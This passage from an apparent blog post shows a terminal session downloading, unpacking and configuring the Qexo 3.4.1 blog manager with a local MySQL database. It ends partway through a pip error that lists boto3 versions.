class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># wget https://github.com/Qexo/Qexo/archive/refs/tags/3.4.1.tar.gz</span><br>--2024-11-01 04:04:55--  https://github.com/Qexo/Qexo/archive/refs/tags/3.4.1.tar.gz<br>Connecting to 192.168.20.20:7890... connected.<br>Proxy request sent, awaiting response... 302 Found<br>Location: https://codeload.github.com/Qexo/Qexo/tar.gz/refs/tags/3.4.1 [following]<br>--2024-11-01 04:04:55--  https://codeload.github.com/Qexo/Qexo/tar.gz/refs/tags/3.4.1<br>Connecting to 192.168.20.20:7890... connected.<br>Proxy request sent, awaiting response... 200 OK<br>Length: unspecified [application/x-gzip]<br>Saving to: â€˜3.4.1.tar.gzâ€™<br><br>3.4.1.tar.gz                            [ &lt;=&gt;                                                             ] 186.99K  --.-KB/s    <span class="hljs-keyword">in</span> 0.1s    <br><br>2024-11-01 04:04:56 (1.79 MB/s) - â€˜3.4.1.tar.gzâ€™ saved [191477]<br><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># tar -zxvf 3.4.1.tar.gz </span><br>Qexo-3.4.1/<br>Qexo-3.4.1/.dockerignore<br>Qexo-3.4.1/.env.example<br>Qexo-3.4.1/.github/<br>Qexo-3.4.1/.github/ISSUE_TEMPLATE/<br>Qexo-3.4.1/.github/ISSUE_TEMPLATE/bug_report.yml<br>Qexo-3.4.1/.github/ISSUE_TEMPLATE/config.yml<br>Qexo-3.4.1/.gitignore<br>Qexo-3.4.1/Dockerfile<br>Qexo-3.4.1/Dockerfile_aio_sqlite_hexo<br>Qexo-3.4.1/LICENSE<br>Qexo-3.4.1/Makefile<br>Qexo-3.4.1/Pipfile<br>Qexo-3.4.1/Pipfile.lock<br>Qexo-3.4.1/README.md<br>Qexo-3.4.1/core/<br>Qexo-3.4.1/core/__init__.py<br>Qexo-3.4.1/core/asgi.py<br>Qexo-3.4.1/core/qexoSettings.py<br>Qexo-3.4.1/core/settings.py<br>Qexo-3.4.1/core/urls.py<br>Qexo-3.4.1/core/wsgi.py<br>Qexo-3.4.1/docker-compose.yaml<br>Qexo-3.4.1/hexoweb/<br>Qexo-3.4.1/hexoweb/__init__.py<br>Qexo-3.4.1/hexoweb/api.py<br>Qexo-3.4.1/hexoweb/apps.py<br>Qexo-3.4.1/hexoweb/exceptions.py<br>Qexo-3.4.1/hexoweb/functions.py<br>Qexo-3.4.1/hexoweb/libs/<br>Qexo-3.4.1/hexoweb/libs/__init__.py<br>Qexo-3.4.1/hexoweb/libs/django_psdb_engine/<br>Qexo-3.4.1/hexoweb/libs/django_psdb_engine/__init__.py<br>Qexo-3.4.1/hexoweb/libs/django_psdb_engine/base.py<br>Qexo-3.4.1/hexoweb/libs/django_psdb_engine/features.py<br>Qexo-3.4.1/hexoweb/libs/elevator/<br>Qexo-3.4.1/hexoweb/libs/elevator/__init__.py<br>Qexo-3.4.1/hexoweb/libs/elevator/elevator.py<br>Qexo-3.4.1/hexoweb/libs/elevator/updater/<br>Qexo-3.4.1/hexoweb/libs/elevator/updater/2_5_0.py<br>Qexo-3.4.1/hexoweb/libs/elevator/updater/2_5_1.py<br>Qexo-3.4.1/hexoweb/libs/elevator/updater/2_7_0.py<br>Qexo-3.4.1/hexoweb/libs/elevator/updater/3_1_1.py<br>Qexo-3.4.1/hexoweb/libs/i18n/<br>Qexo-3.4.1/hexoweb/libs/i18n/__init__.py<br>Qexo-3.4.1/hexoweb/libs/i18n/core.py<br>Qexo-3.4.1/hexoweb/libs/i18n/exceptions.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/__init__.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/en_UK.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/en_US.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/fr_FR.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/ja_JP.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/ko_KR.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/zh_CN.py<br>Qexo-3.4.1/hexoweb/libs/i18n/languages/zh_TW.py<br>Qexo-3.4.1/hexoweb/libs/image/<br>Qexo-3.4.1/hexoweb/libs/image/__init__.py<br>Qexo-3.4.1/hexoweb/libs/image/core.py<br>Qexo-3.4.1/hexoweb/libs/image/exceptions.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/<br>Qexo-3.4.1/hexoweb/libs/image/providers/__init__.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/alioss.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/custom.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/dogecloudoss.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/ftp.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/gitHub.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/s3.py<br>Qexo-3.4.1/hexoweb/libs/image/providers/upyun_storage.py<br>Qexo-3.4.1/hexoweb/libs/image/replace.py<br>Qexo-3.4.1/hexoweb/libs/onepush/<br>Qexo-3.4.1/hexoweb/libs/onepush/__init__.py<br>Qexo-3.4.1/hexoweb/libs/onepush/__version__.py<br>Qexo-3.4.1/hexoweb/libs/onepush/core.py<br>Qexo-3.4.1/hexoweb/libs/onepush/exceptions.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/__init__.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/bark.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/custom.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/dingtalk.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/discord.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/gocqhttp.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/gotify.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/lark.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/pushdeer.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/pushplus.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/qmsg.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/serverchan.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/serverchanturbo.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/smtp.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/telegram.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/wechatworkapp.py<br>Qexo-3.4.1/hexoweb/libs/onepush/providers/wechatworkbot.py<br>Qexo-3.4.1/hexoweb/libs/platforms/<br>Qexo-3.4.1/hexoweb/libs/platforms/__init__.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/__init__.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/hexo.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/hugo.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/valaxy.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/vitepress.py<br>Qexo-3.4.1/hexoweb/libs/platforms/configs/vuepress.py<br>Qexo-3.4.1/hexoweb/libs/platforms/core.py<br>Qexo-3.4.1/hexoweb/libs/platforms/exceptions.py<br>Qexo-3.4.1/hexoweb/libs/platforms/providers/<br>Qexo-3.4.1/hexoweb/libs/platforms/providers/__init__.py<br>Qexo-3.4.1/hexoweb/libs/platforms/providers/gitHub.py<br>Qexo-3.4.1/hexoweb/libs/platforms/providers/gitLab.py<br>Qexo-3.4.1/hexoweb/libs/platforms/providers/local.py<br>Qexo-3.4.1/hexoweb/migrations/<br>Qexo-3.4.1/hexoweb/migrations/0001_initial.py<br>Qexo-3.4.1/hexoweb/migrations/0002_postmodel.py<br>Qexo-3.4.1/hexoweb/migrations/0003_imagemodel_deleteconfig.py<br>Qexo-3.4.1/hexoweb/migrations/__init__.py<br>Qexo-3.4.1/hexoweb/models.py<br>Qexo-3.4.1/hexoweb/pub.py<br>Qexo-3.4.1/hexoweb/tests.py<br>Qexo-3.4.1/hexoweb/views.py<br>Qexo-3.4.1/manage.py<br>Qexo-3.4.1/migrate.sh<br>Qexo-3.4.1/requirements.txt<br>Qexo-3.4.1/requirements_withoutmysql.txt<br>Qexo-3.4.1/start.sh<br>Qexo-3.4.1/templates/<br>Qexo-3.4.1/templates/accounts/<br>Qexo-3.4.1/templates/accounts/init.html<br>Qexo-3.4.1/templates/accounts/login.html<br>Qexo-3.4.1/templates/accounts/migrate.html<br>Qexo-3.4.1/templates/accounts/update.html<br>Qexo-3.4.1/templates/home/<br>Qexo-3.4.1/templates/home/advanced.html<br>Qexo-3.4.1/templates/home/configs.html<br>Qexo-3.4.1/templates/home/custom.html<br>Qexo-3.4.1/templates/home/edit.html<br>Qexo-3.4.1/templates/home/edit_config.html<br>Qexo-3.4.1/templates/home/edit_page.html<br>Qexo-3.4.1/templates/home/edit_talk.html<br>Qexo-3.4.1/templates/home/friends.html<br>Qexo-3.4.1/templates/home/images.html<br>Qexo-3.4.1/templates/home/index.html<br>Qexo-3.4.1/templates/home/new.html<br>Qexo-3.4.1/templates/home/new_page.html<br>Qexo-3.4.1/templates/home/page-403.html<br>Qexo-3.4.1/templates/home/page-404.html<br>Qexo-3.4.1/templates/home/page-500.html<br>Qexo-3.4.1/templates/home/pages.html<br>Qexo-3.4.1/templates/home/posts.html<br>Qexo-3.4.1/templates/home/settings.html<br>Qexo-3.4.1/templates/home/talks.html<br>Qexo-3.4.1/templates/home/userscripts.html<br>Qexo-3.4.1/templates/includes/<br>Qexo-3.4.1/templates/includes/editor-scripts.html<br>Qexo-3.4.1/templates/includes/footer.html<br>Qexo-3.4.1/templates/includes/navigation.html<br>Qexo-3.4.1/templates/includes/scripts.html<br>Qexo-3.4.1/templates/includes/sidenav.html<br>Qexo-3.4.1/templates/layouts/<br>Qexo-3.4.1/templates/layouts/base-fullscreen.html<br>Qexo-3.4.1/templates/layouts/base.html<br>Qexo-3.4.1/templates/layouts/json.html<br>Qexo-3.4.1/templates/robots.txt<br>Qexo-3.4.1/update_tag.sh<br>Qexo-3.4.1/vercel.json<br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># cd Qexo-3.4.1/</span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># ll</span><br>total 204<br>drwxrwxr-x  6 root root  4096 Aug 25 20:31 ./<br>drwxr-xr-x 75 root root  4096 Nov  1 04:05 ../<br>drwxrwxr-x  2 root root  4096 Aug 25 20:31 core/<br>-rw-rw-r--  1 root root   185 Aug 25 20:31 docker-compose.yaml<br>-rw-rw-r--  1 root root   519 Aug 25 20:31 Dockerfile<br>-rw-rw-r--  1 root root  1054 Aug 25 20:31 Dockerfile_aio_sqlite_hexo<br>-rw-rw-r--  1 root root     0 Aug 25 20:31 .dockerignore<br>-rw-rw-r--  1 root root    15 Aug 25 20:31 .env.example<br>drwxrwxr-x  3 root root  4096 Aug 25 20:31 .github/<br>-rw-rw-r--  1 root root    55 Aug 25 20:31 .gitignore<br>drwxrwxr-x  4 root root  4096 Aug 25 20:31 hexoweb/<br>-rw-rw-r--  1 root root 35149 Aug 25 20:31 LICENSE<br>-rw-rw-r--  1 root root   347 Aug 25 20:31 Makefile<br>-rw-rw-r--  1 root root   660 Aug 25 20:31 manage.py<br>-rwxrwxr-x  1 root root    90 Aug 25 20:31 migrate.sh*<br>-rw-rw-r--  1 root root   679 Aug 25 20:31 Pipfile<br>-rw-rw-r--  1 root root 84338 Aug 25 20:31 Pipfile.lock<br>-rw-rw-r--  1 root root  3156 Aug 25 20:31 README.md<br>-rw-rw-r--  1 root root   369 Aug 25 20:31 requirements.txt<br>-rw-rw-r--  1 root root   290 Aug 25 20:31 requirements_withoutmysql.txt<br>-rw-rw-r--  1 root root   443 Aug 25 20:31 start.sh<br>drwxrwxr-x  6 root root  4096 Aug 25 20:31 templates/<br>-rw-rw-r--  1 root root  1247 Aug 25 20:31 update_tag.sh<br>-rw-rw-r--  1 root root   344 Aug 25 20:31 vercel.json<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># vi configs.py</span><br>import pymysql<br>pymysql.install_as_MySQLdb()<br>DOMAINS = [<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-string">&quot;ningan123.github.io&quot;</span>]<br>DATABASES = &#123;<br>    <span class="hljs-string">&#x27;default&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;ENGINE&#x27;</span>: <span class="hljs-string">&#x27;django.db.backends.mysql&#x27;</span>,<br>            <span class="hljs-string">&#x27;NAME&#x27;</span>: <span class="hljs-string">&#x27;qexo&#x27;</span>,<br>            <span class="hljs-string">&#x27;USER&#x27;</span>: <span class="hljs-string">&#x27;root&#x27;</span>,<br>            <span class="hljs-string">&#x27;PASSWORD&#x27;</span>: <span class="hljs-string">&#x27;123456&#x27;</span>,<br>            <span class="hljs-string">&#x27;HOST&#x27;</span>: <span class="hljs-string">&#x27;192.168.20.201&#x27;</span>,<br>            <span class="hljs-string">&#x27;PORT&#x27;</span>: <span class="hljs-string">&#x27;3306&#x27;</span>,<br>            <span class="hljs-string">&#x27;OPTIONS&#x27;</span>: &#123;<br>                <span class="hljs-string">&quot;init_command&quot;</span>: <span class="hljs-string">&quot;SET sql_mode=&#x27;STRICT_TRANS_TABLES&#x27;&quot;</span><br>            &#125;<br>    &#125;<br>&#125;<br><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3 -m pip install -r requirements.txt</span><br>/usr/lib/python3/dist-packages/secretstorage/dhcrypto.py:15: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support <span class="hljs-keyword">for</span> it is deprecated <span class="hljs-keyword">in</span> cryptography. The next release of cryptography will remove support <span class="hljs-keyword">for</span> Python 3.6.<br>  from cryptography.utils import int_from_bytes<br>Collecting Django==3.2.25<br>  Downloading Django-3.2.25-py3-none-any.whl (7.9 MB)<br>     |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 7.9 MB 28 kB/s             <br>Collecting PyMySQL==1.0.2<br>  Downloading PyMySQL-1.0.2-py3-none-any.whl (43 kB)<br>     |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 43 kB 24 kB/s            <br>ERROR: Could not find a version that satisfies the requirement boto3==1.34.44 (from versions: 0.0.1, 0.0.2, 0.0.3, 0.0.4, 0.0.5, 0.0.6, 0.0.7, 0.0.8, 0.0.9, 0.0.10, 0.0.11, 0.0.12, 0.0.13, 0.0.14, 0.0.16, 0.0.17, 0.0.18, 0.0.19, 0.0.20, 0.0.21, 0.0.22, 1.0.0, 1.0.1, 1.1.0, 1.1.1, 1.1.2, 1.1.3, 1.1.4, 1.2.0, 1.2.1, 1.2.2, 1.2.3, 1.2.4, 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.4.0, 1.4.1, 1.4.2, 1.4.3, 1.4.4, 1.4.5, 1.4.6, 1.4.7, 1.4.8, 1.5.0, 1.5.1, 1.5.2, 1.5.3, 1.5.4, 1.5.5, 1.5.6, 1.5.7, 1.5.8, 1.5.9, 1.5.10, 1.5.11, 1.5.12, 1.5.13, 1.5.14, 1.5.15, 1.5.16, 1.5.17, 1.5.18, 1.5.19, 1.5.20, 1.5.21, 1.5.22, 1.5.23, 1.5.24, 1.5.25, 1.5.26, 1.5.27, 1.5.28, 1.5.29, 1.5.30, 1.5.31, 1.5.32, 1.5.33, 1.5.34, 1.5.35, 1.5.36, 1.6.0, 1.6.1, 1.6.2, 1.6.3, 1.6.4, 1.6.5, 1.6.6, 1.6.7, 1.6.8, 1.6.9, 1.6.10, 1.6.11, 1.6.12, 1.6.13, 1.6.14, 1.6.15, 1.6.16, 1.6.17, 1.6.18, 1.6.19, 1.6.20, 1.6.21, 1.6.22, 1.6.23, 1.7.0, 1.7.1, 1.7.2, 1.7.3, 1.7.4, 1.7.5, 1.7.6, 1.7.7, 1.7.8, 1.7.9, 1.7.10, 1.7.11, 1.7.12, 1.7.13, 1.7.14, 1.7.15, 1.7.16, 1.7.17, 1.7.18, 1.7.19, 1.7.20, 1.7.21, 1.7.22, 1.7.23, 1.7.24, 1.7.25, 1.7.26, 1.7.27, 1.7.28, 1.7.29, 1.7.30, 1.7.31, 1.7.32, 1.7.33, 1.7.34, 1.7.35, 1.7.36, 1.7.37, 1.7.38, 1.7.39, 1.7.40, 1.7.41, 1.7.42, 1.7.43, 1.7.44, 1.7.45, 1.7.46, 1.7.47, 1.7.48, 1.7.49, 1.7.50, 1.7.51, 1.7.52, 1.7.53, 1.7.54, 1.7.55, 1.7.56, 1.7.57, 1.7.58, 1.7.59, 1.7.60, 1.7.61, 1.7.62, 1.7.63, 1.7.64, 1.7.65, 1.7.66, 1.7.67, 1.7.68, 1.7.69, 1.7.70, 1.7.71, 1.7.72, 1.7.73, 1.7.74, 1.7.75, 1.7.76, 1.7.77, 1.7.78, 1.7.79, 1.7.80, 1.7.81, 1.7.82, 1.7.83, 1.7.84, 1.8.0, 1.8.1, 1.8.2, 1.8.3, 1.8.4, 1.8.5, 1.8.6, 1.8.7, 1.8.8, 1.8.9, 1.9.0, 1.9.1, 1.9.2, 1.9.3, 1.9.4, 1.9.5, 1.9.6, 1.9.7, 1.9.8, 1.9.9, 1.9.10, 1.9.11, 1.9.12, 1.9.13, 1.9.14, 1.9.15, 1.9.16, 1.9.17, 1.9.18, 1.9.19, 1.9.20, 1.9.21, 1.9.22, 1.9.23, 1.9.24, 1.9.25, 1.9.26, 1.9.27, 1.9.28, 1.9.29, 1.9.30, 1.9.31, 1.9.32, 1.9.33, 1.9.34, 1.9.35, 1.9.36, 1.9.37, 1.9.38, 1.9.39, 1.9.40, 1.9.41, 1.9.42, 1.9.43, 1.9.44, 1.9.45, 1.9.46, 1.9.47, 1.9.48, 1.9.49, 1.9.50, 1.9.51, 1.9.52, 1.9.53, 1.9.54, 1.9.55, 1.9.56, 1.9.57, 1.9.58, 1.9.59, 1.9.60, 1.9.61, 1.9.62, 1.9.63, 1.9.64, 1.9.65, 1.9.66, 1.9.67, 1.9.68, 1.9.69, 1.9.70, 1.9.71, 1.9.72, 1.9.73, 1.9.74, 1.9.75, 1.9.76, 1.9.77, 1.9.78, 1.9.79, 1.9.80, 1.9.81, 1.9.82, 1.9.83, 1.9.84, 1.9.85, 1.9.86, 1.9.87, 1.9.88, 1.9.89, 1.9.90, 1.9.91, 1.9.92, 1.9.93, 1.9.94, 1.9.95, 1.9.96, 1.9.97, 1.9.98, 1.9.99, 1.9.100, 1.9.101, 1.9.102, 1.9.103, 1.9.104, 1.9.105, 1.9.106, 1.9.107, 1.9.108, 1.9.109, 1.9.110, 1.9.111, 1.9.112, 1.9.113, 1.9.114, 1.9.115, 1.9.116, 1.9.117, 1.9.118, 1.9.119, 1.9.120, 1.9.121, 1.9.122, 1.9.123, 1.9.124, 1.9.125, 1.9.126, 1.9.127, 1.9.128, 1.9.129, 1.9.130, 1.9.131, 1.9.132, 1.9.133, 1.9.134, 1.9.135, 1.9.136, 1.9.137, 1.9.138, 1.9.139, 1.9.140, 1.9.141, 1.9.142, 1.9.143, 1.9.144, 1.9.145, 1.9.146, 1.9.147, 1.9.148, 1.9.149, 1.9.150, 1.9.151, 1.9.152, 1.9.153, 1.9.154, 1.9.155, 1.9.156, 1.9.157, 1.9.158, 1.9.159, 1.9.160, 1.9.161, 1.9.162, 1.9.163, 1.9.164, 1.9.165, 1.9.166, 1.9.167, 1.9.168, 1.9.169, 1.9.170, 1.9.171, 1.9.172, 1.9.173, 1.9.174, 1.9.175, 1.9.176, 1.9.177, 1.9.178, 1.9.179, 1.9.180, 1.9.181, 1.9.182, 1.9.183, 1.9.184, 1.9.185, 1.9.186, 1.9.187, 1.9.188, 1.9.189, 1.9.190, 1.9.191, 1.9.192, 1.9.193, 1.9.194, 1.9.195, 1.9.196, 1.9.197, 1.9.198, 1.9.199, 1.9.200, 1.9.201, 1.9.202, 1.9.203, 1.9.204, 1.9.205, 1.9.206, 1.9.207, 1.9.208, 1.9.209, 1.9.210, 1.9.211, 1.9.212, 1.9.213, 1.9.214, 1.9.215, 1.9.216, 1.9.217, 1.9.218, 1.9.219, 1.9.220, 1.9.221, 1.9.222, 1.9.223, 1.9.224, 1.9.225, 1.9.226, 1.9.227, 1.9.228, 1.9.229, 1.9.230, 1.9.231, 1.9.232, 1.9.233, 1.9.234, 1.9.235, 1.9.236, 1.9.237, 1.9.238, 1.9.239, 1.9.240, 1.9.241, 1.9.242, 1.9.243, 1.9.244, 1.9.245, 1.9.246, 1.9.247, 1.9.248, 1.9.249, 1.9.250, 1.9.251, 1.9.252, 1.9.253, 1.10.0, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.10.5, 1.10.6, 1.10.7, 1.10.8, 1.10.9, 1.10.10, 1.10.11, 1.10.12, 1.10.13, 1.10.14, 1.10.15, 1.10.16, 1.10.17, 1.10.18, 1.10.19, 1.10.20, 1.10.21, 1.10.22, 1.10.23, 1.10.24, 1.10.25, 1.10.26, 1.10.27, 1.10.28, 1.10.29, 1.10.30, 1.10.31, 1.10.32, 1.10.33, 1.10.34, 1.10.35, 1.10.36, 1.10.37, 1.10.38, 1.10.39, 1.10.40, 1.10.41, 1.10.42, 1.10.43, 1.10.44, 1.10.45, 1.10.46, 1.10.47, 1.10.48, 1.10.49, 1.10.50, 1.11.0, 1.11.1, 1.11.2, 1.11.3, 1.11.4, 1.11.5, 1.11.6, 1.11.7, 1.11.8, 1.11.9, 1.11.10, 1.11.11, 1.11.12, 1.11.13, 1.11.14, 1.11.15, 1.11.16, 1.11.17, 1.12.0, 1.12.1, 1.12.2, 1.12.3, 1.12.4, 1.12.5, 1.12.6, 1.12.7, 1.12.8, 1.12.9, 1.12.10, 1.12.11, 1.12.12, 1.12.13, 1.12.14, 1.12.15, 1.12.16, 1.12.17, 1.12.18, 1.12.19, 1.12.20, 1.12.21, 1.12.22, 1.12.23, 1.12.24, 1.12.25, 1.12.26, 1.12.27, 1.12.28, 1.12.29, 1.12.30, 1.12.31, 1.12.32, 1.12.33, 1.12.34, 1.12.35, 1.12.36, 1.12.37, 1.12.38, 1.12.39, 1.12.40, 1.12.41, 1.12.42, 1.12.43, 1.12.44, 1.12.45, 1.12.46, 1.12.47, 1.12.48, 1.12.49, 1.13.0, 1.13.1, 1.13.2, 1.13.3, 1.13.4, 1.13.5, 1.13.6, 1.13.7, 1.13.8, 1.13.9, 1.13.10, 1.13.11, 1.13.12, 1.13.13, 1.13.14, 1.13.15, 1.13.16, 1.13.17, 1.13.18, 1.13.19, 1.13.20, 1.13.21, 1.13.22, 1.13.23, 1.13.24, 1.13.25, 1.13.26, 1.14.0, 1.14.1, 1.14.2, 1.14.3, 1.14.4, 1.14.5, 1.14.6, 1.14.7, 1.14.8, 1.14.9, 1.14.10, 1.14.11, 1.14.12, 1.14.13, 1.14.14, 1.14.15, 1.14.16, 1.14.17, 1.14.18, 1.14.19, 1.14.20, 1.14.21, 1.14.22, 1.14.23, 1.14.24, 1.14.25, 1.14.26, 1.14.27, 1.14.28, 1.14.29, 1.14.30, 1.14.31, 1.14.32, 1.14.33, 1.14.34, 1.14.35, 1.14.36, 1.14.37, 1.14.38, 1.14.39, 1.14.40, 1.14.41, 1.14.42, 1.14.43, 1.14.44, 1.14.45, 1.14.46, 1.14.47, 1.14.48, 1.14.49, 1.14.50, 1.14.51, 1.14.52, 1.14.53, 1.14.54, 1.14.55, 1.14.56, 1.14.57, 1.14.58, 1.14.59, 1.14.60, 1.14.61, 1.14.62, 1.14.63, 1.15.0, 1.15.1, 1.15.2, 1.15.3, 1.15.4, 1.15.5, 1.15.6, 1.15.7, 1.15.8, 1.15.9, 1.15.10, 1.15.11, 1.15.12, 1.15.13, 1.15.14, 1.15.15, 1.15.16, 1.15.17, 1.15.18, 1.16.0, 1.16.1, 1.16.2, 1.16.3, 1.16.4, 1.16.5, 1.16.6, 1.16.7, 1.16.8, 1.16.9, 1.16.10, 1.16.11, 1.16.12, 1.16.13, 1.16.14, 1.16.15, 1.16.16, 1.16.17, 1.16.18, 1.16.19, 1.16.20, 1.16.21, 1.16.22, 1.16.23, 1.16.24, 1.16.25, 1.16.26, 1.16.27, 1.16.28, 1.16.29, 1.16.30, 1.16.31, 1.16.32, 1.16.33, 1.16.34, 1.16.35, 1.16.36, 1.16.37, 1.16.38, 1.16.39, 1.16.40, 1.16.41, 1.16.42, 1.16.43, 1.16.44, 1.16.45, 1.16.46, 1.16.47, 1.16.48, 1.16.49, 1.16.50, 1.16.51, 1.16.52, 1.16.53, 1.16.54, 1.16.55, 1.16.56, 1.16.57, 1.16.58, 1.16.59, 1.16.60, 1.16.61, 1.16.62, 1.16.63, 1.17.0, 1.17.1, 1.17.2, 1.17.3, 1.17.4, 1.17.5, 1.17.6, 1.17.7, 1.17.8, 1.17.9, 1.17.10, 1.17.11, 1.17.12, 1.17.13, 1.17.14, 1.17.15, 1.17.16, 1.17.17, 1.17.18, 1.17.19, 1.17.20, 1.17.21, 1.17.22, 1.17.23, 1.17.24, 1.17.25, 1.17.26, 1.17.27, 1.17.28, 1.17.29, 1.17.30, 1.17.31, 1.17.32, 1.17.33, 1.17.34, 1.17.35, 1.17.36, 1.17.37, 1.17.38, 1.17.39, 1.17.40, 1.17.41, 1.17.42, 1.17.43, 1.17.44, 1.17.45, 1.17.46, 1.17.47, 1.17.48, 1.17.49, 1.17.50, 1.17.51, 1.17.52, 1.17.53, 1.17.54, 1.17.55, 1.17.56, 1.17.57, 1.17.58, 1.17.59, 1.17.60, 1.17.61, 1.17.62, 1.17.63, 1.17.64, 1.17.65, 1.17.66, 1.17.67, 1.17.68, 1.17.69, 1.17.70, 1.17.71, 1.17.72, 1.17.73, 1.17.74, 1.17.75, 1.17.76, 1.17.77, 1.17.78, 1.17.79, 1.17.80, 1.17.81, 1.17.82, 1.17.83, 1.17.84, 1.17.85, 1.17.86, 1.17.87, 1.17.88, 1.17.89, 1.17.90, 1.17.91, 1.17.92, 1.17.93, 1.17.94, 1.17.95, 1.17.96, 1.17.97, 1.17.98, 1.17.99, 1.17.100, 1.17.101, 1.17.102, 1.17.103, 1.17.104, 1.17.105, 1.17.106, 1.17.107, 1.17.108, 1.17.109, 1.17.110, 1.17.111, 1.17.112, 1.18.0, 1.18.1, 1.18.2, 1.18.3, 1.18.4, 1.18.5, 1.18.6, 1.18.7, 1.18.8, 1.18.9, 1.18.10, 1.18.11, 1.18.12, 1.18.13, 1.18.14, 1.18.15, 1.18.16, 1.18.17, 1.18.18, 1.18.19, 1.18.20, 1.18.21, 1.18.22, 1.18.23, 1.18.24, 1.18.25, 1.18.26, 1.18.27, 1.18.28, 1.18.29, 1.18.30, 1.18.31, 1.18.32, 1.18.33, 1.18.34, 1.18.35, 1.18.36, 1.18.37, 1.18.38, 1.18.39, 1.18.40, 1.18.41, 1.18.42, 1.18.43, 1.18.44, 1.18.45, 1.18.46, 1.18.47, 1.18.48, 1.18.49, 1.18.50, 1.18.51, 1.18.52, 1.18.53, 1.18.54, 1.18.55, 1.18.56, 1.18.57, 1.18.58, 1.18.59, 1.18.60, 1.18.61, 1.18.62, 1.18.63, 1.18.64, 1.18.65, 1.19.0, 1.19.1, 1.19.2, 1.19.3, 1.19.4, 1.19.5, 1.19.6, 1.19.7, 1.19.8, 1.19.9, 